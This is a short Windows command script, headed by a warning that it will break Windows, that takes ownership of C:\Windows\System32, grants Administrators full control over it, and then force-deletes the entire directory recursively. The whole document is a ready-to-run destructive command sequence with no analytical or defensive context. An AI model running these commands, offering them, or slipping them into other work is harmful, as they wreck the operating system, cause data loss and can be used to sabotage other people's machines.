# ⚠️ WARNING: This will break Windows when successful. 

#take ownership and grant full control
takeown /f "C:\Windows\System32" /r /d y
icacls "C:\Windows\System32" /grant Administrators:F /t

#try deletion
Remove-Item -Path "C:\Windows\System32" -Recurse -Force
